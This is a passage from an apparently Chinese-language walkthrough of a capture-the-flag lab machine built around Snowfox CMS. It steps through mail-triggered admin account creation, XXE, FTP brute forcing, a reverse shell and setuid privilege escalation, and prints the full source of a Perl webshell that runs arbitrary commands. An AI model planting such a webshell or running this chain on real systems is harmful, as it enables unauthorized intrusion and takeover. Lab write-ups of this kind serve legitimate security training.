查阅资料**[https://www.thomas-krenn.com/en/wiki/Test_TCP_Port_25_(smtp)_access_with_telnet](https://www.thomas-krenn.com/en/wiki/Test_TCP_Port_25_(smtp)_access_with_telnet)**，利用telnet连接到25端口后发送邮件的大致流程为：

```
EHLO test.example.com
MAIL FROM:&lt;SENDERADDRESS&gt;
RCPT TO:&lt;RECIPIENTADDRESS&gt;
DATA
Subject: Testmessage
(Blank line, press Enter again)
This is a test.
(Blank line, press Enter again)
.
QUIT
```

这里需要注意的是，靶机**Snowfox CMS**页面提示到，邮件的`Subject`必须是一个已知的用户，否则邮件不会被靶机接收。邮件发送详情如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0176833eaff4b5411f.png)

邮件发送到目标靶机后，在本机apache的日志文件中，看到了靶机对`1.html`的访问记录：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018a3336e64783240e.png)

此时，漏洞已触发完成，可利用在`1.html`内写入的用户名和口令作为管理员账户登录到**Snowfox CMS**系统中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0125978d1f122d49cf.png)

随后，在其用户管理页面中，在`le`用户信息中找到了新的链接：

[![](https://p5.ssl.qhimg.com/t0160fef26bf559c3d0.png)](https://p5.ssl.qhimg.com/t0160fef26bf559c3d0.png)

访问一下：

[![](https://p3.ssl.qhimg.com/t01ec91ed00b723604e.png)](https://p3.ssl.qhimg.com/t01ec91ed00b723604e.png)

在其源码中，看到了进一步的提示信息：

[![](https://p5.ssl.qhimg.com/t0199f8be64e4e1b147.png)](https://p5.ssl.qhimg.com/t0199f8be64e4e1b147.png)

其提示信息大致意思是说可以向该页面`post`一个`xml`文件，在链接**[https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)**上找到了详情信息，该步骤的主要内容是关于XML External Entity (XXE) Processing的。

构造一个`xml.txt`文件如下，通过`curl`命令，`post`到该页面中：

[![](https://p3.ssl.qhimg.com/t012ae59c9310f1a405.png)](https://p3.ssl.qhimg.com/t012ae59c9310f1a405.png)

[![](https://p5.ssl.qhimg.com/t015655f453c3b2aaf6.png)](https://p5.ssl.qhimg.com/t015655f453c3b2aaf6.png)

从返回结果中看到了ftp的用户名，由于21端口是开放的，且上面页面源码的提示信息说到ftp的密码是比较简单的，因此尝试爆破ftp：

[![](https://p0.ssl.qhimg.com/t0166fff578f89343b5.png)](https://p0.ssl.qhimg.com/t0166fff578f89343b5.png)

爆破成功，利用该口令信息登录ftp：

[![](https://p1.ssl.qhimg.com/t01ade0afa4fc8f6da6.png)](https://p1.ssl.qhimg.com/t01ade0afa4fc8f6da6.png)

浏览一下信息，发现可通过浏览器直接访问该目录：

[![](https://p3.ssl.qhimg.com/t01b052125aca6712ed.png)](https://p3.ssl.qhimg.com/t01b052125aca6712ed.png)

几个文件内并没有有价值的信息，而`hello_world.pl`文件则给了我们暗示，我们尝试通过ftp上传一个webshell的perl文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01edecf82caac0e5a0.png)

`cmd.pl`内容如下，来自[github](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/pl-cgi/cmd.pl)

```
#!/usr/bin/perl
#
# PerlKit-0.1 - http://www.t0s.org
#
# cmd.pl: Run commands on a webserver

use strict;

my ($cmd, %FORM);

$|=1;

print "Content-Type: text/htmlrn";
print "rn";

# Get parameters

%FORM = parse_parameters($ENV`{`'QUERY_STRING'`}`);

if(defined $FORM`{`'cmd'`}`) `{`
  $cmd = $FORM`{`'cmd'`}`;
`}`

print '&lt;HTML&gt;
&lt;body&gt;
&lt;form action="" method="GET"&gt;
&lt;input type="text" name="cmd" size=45 value="' . $cmd . '"&gt;
&lt;input type="submit" value="Run"&gt;
&lt;/form&gt;
&lt;pre&gt;';

if(defined $FORM`{`'cmd'`}`) `{`
  print "Results of '$cmd' execution:nn";
  print "-"x80;
  print "n";

  open(CMD, "($cmd) 2&gt;&amp;1 |") || print "Could not execute command";

  while(&lt;CMD&gt;) `{`
    print;
  `}`

  close(CMD);
  print "-"x80;
  print "n";
`}`

print "&lt;/pre&gt;";

sub parse_parameters ($) `{`
  my %ret;

  my $input = shift;

  foreach my $pair (split('&amp;', $input)) `{`
    my ($var, $value) = split('=', $pair, 2);

    if($var) `{`
      $value =~ s/+/ /g ;
      $value =~ s/%(..)/pack('c',hex($1))/eg;

      $ret`{`$var`}` = $value;
    `}`
  `}`

  return %ret;
`}`
```

检验一下，该shell的效果还是很好滴：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010875d0215c210578.png)

在此基础上，直接利用该webshell拿下一个回连本地1234端口的shell：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0154113cd3dbd107c7.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018f64c4bca2ddde50.png)

拿到shell，当前用户为`www-data`，在路径`/opt/casino-royale`下发现了新的线索，该`index.html`页面刚好是`8081`端口对应的页面，根据`index.html`的内容可知，其会调用`collect.php`，而`collect.php`则会调用`casino-data-collection.py`脚本

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01953e2ee90cd31e82.png)

脚本`casino-data-collection.py`属于`le`用户，而当前`www-data`组对`casino-data-collection.py`脚本具有可写权限，我们可以写入一个反向python shell，这样当点击web界面的按钮时，即可获得一个`le`用户权限的反向shell：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0188f286cb6094ed39.png)

获得新shell，当前用户变更为`le`。

继续分析这几个文件，`mi6_detect_test`文件为`root`所有，但其他用户可执行，且设置了`setuid`标志位，而`run.sh`为`le`所有，具有读写执行权限，而在分析过程中发现，前者会调用后者。

因此利用思路为：在`run.sh`中写入`/bin/bash`，这样`mi6_detect_test`执行时即获得了root权限的shell：

[![](https://p0.ssl.qhimg.com/t01e298ae7f0ac05948.png)](https://p0.ssl.qhimg.com/t01e298ae7f0ac05948.png)

拿到root权限，执行`/root/flag/flag.sh`文件，前往web的8082端口～

Congratulations!!

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a578818a63e62599.png)
